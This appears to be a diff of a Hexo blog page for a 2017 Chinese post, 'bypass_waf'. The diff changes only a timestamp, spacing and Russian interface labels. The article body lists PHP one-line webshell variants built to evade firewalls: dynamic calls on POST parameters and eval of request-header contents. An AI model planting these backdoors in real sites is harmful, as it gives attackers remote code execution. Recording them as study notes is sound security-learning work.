@@ -5,17 +5,17 @@
   
   <title>bypass_waf | Merl1ng</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post d">
+  <meta name="description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post">
 <meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bypass_waf">
 <meta property="og:url" content="http://Merl1ng.com/2017/07/20/bypass_waf/index.html">
 <meta property="og:site_name" content="Merl1ng">
-<meta property="og:description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post d">
-<meta property="og:updated_time" content="2017-07-20T14:34:41.261Z">
+<meta property="og:description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post">
+<meta property="og:updated_time" content="2017-07-20T14:39:25.185Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="bypass_waf">
-<meta name="twitter:description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post d">
+<meta name="twitter:description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马 看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post">
   
     <link rel="alternate" href="/atom.xml" title="Merl1ng" type="application/atom+xml">
   
@@ -53,9 +53,9 @@
       </nav>
       <nav id="sub-nav">
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS-каналы"></a>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+        <a id="nav-search-btn" class="nav-icon" title="Поиск"></a>
       </nav>
       <div id="search-form-wrap">
         <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://Merl1ng.com"></form>
@@ -86,7 +86,7 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
+        <p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马 看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
 <p>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
 <p>姿势一 php动态函数 （无eval）<br><code>&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;</code><br>利用 在hackbar Post data<br>写入xx=assert￥oo=QAQ</p>
 <p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
@@ -102,7 +102,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://Merl1ng.com/2017/07/20/bypass_waf/" data-id="cj5cignvb0000o4euqtjtuz5v" class="article-share-link">Share</a>
+      <a data-url="http://Merl1ng.com/2017/07/20/bypass_waf/" data-id="cj5cignvb0000o4euqtjtuz5v" class="article-share-link">Поделиться</a>
       
       
     </footer>
@@ -112,7 +112,7 @@
 <nav id="article-nav">
   
     <a href="/2017/07/18/一句话木马和中国菜刀/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
+      <strong class="article-nav-caption">Следующий</strong>
       <div class="article-nav-title">
         
           一句话木马和中国菜刀
@@ -140,7 +140,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
+    <h3 class="widget-title">Архив</h3>
     <div class="widget">
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li></ul>
     </div>
@@ -150,7 +150,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
+    <h3 class="widget-title">Недавние записи</h3>
     <div class="widget">
       <ul>
         
@@ -187,7 +187,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2017 Saber<br>
-      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Создано с помощью <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
